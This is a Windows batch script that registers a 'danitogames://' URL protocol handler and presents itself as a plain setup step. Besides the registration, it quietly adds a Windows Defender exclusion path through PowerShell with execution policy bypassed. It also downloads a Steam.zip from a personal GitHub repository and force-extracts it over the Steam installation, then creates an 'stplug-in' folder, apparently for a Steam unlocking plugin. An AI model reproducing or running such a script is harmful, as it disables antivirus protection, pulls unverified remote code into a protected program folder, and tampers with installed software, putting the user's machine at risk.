@echo off
setlocal ENABLEDELAYEDEXPANSION
set "HERE=%~dp0"
if "%HERE:~-1%"=="\" set "HERE=%HERE:~0,-1%"

reg add "HKCU\Software\Classes\danitogames" /ve /t REG_SZ /d "URL:DanitoGames Protocol" /f >nul
reg add "HKCU\Software\Classes\danitogames" /v "URL Protocol" /t REG_SZ /d "" /f >nul
reg add "HKCU\Software\Classes\danitogames\DefaultIcon" /ve /t REG_SZ /d "%%SystemRoot%%\System32\shell32.dll,1" /f >nul
reg add "HKCU\Software\Classes\danitogames\shell\open\command" /ve /t REG_SZ /d "\"%HERE%\danitogames_handler.exe\" \"%%1\"" /f >nul

REM Add Windows Defender exclusion (silently skips if Defender is disabled/replaced)
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath 'C:\DanitoGamesHandler' -ErrorAction Stop; Write-Host 'Defender exclusion added' } catch { Write-Host 'Defender not available, skipping exclusion' }"

echo.
echo Installed: danitogames:// protocol
echo Handler: %HERE%\danitogames_handler.exe
echo.

set "TEMPZIP=%TEMP%\steam.zip"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/itsdanitobg/updates/refs/heads/main/Steam.zip' -OutFile '%TEMPZIP%' -UseBasicParsing" >nul 2>&1

if exist "%TEMPZIP%" (
    echo Extracting Steam.zip to "C:\Program Files (x86)\Steam" ...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%TEMPZIP%' -DestinationPath 'C:\Program Files (x86)\Steam' -Force" >nul 2>&1
    del "%TEMPZIP%"
) else (
    echo Failed to download Steam.zip
)

set "STPLUGIN=C:\Program Files (x86)\Steam\config\stplug-in"
if not exist "%STPLUGIN%" mkdir "%STPLUGIN%"

echo Finished setup
echo.
endlocal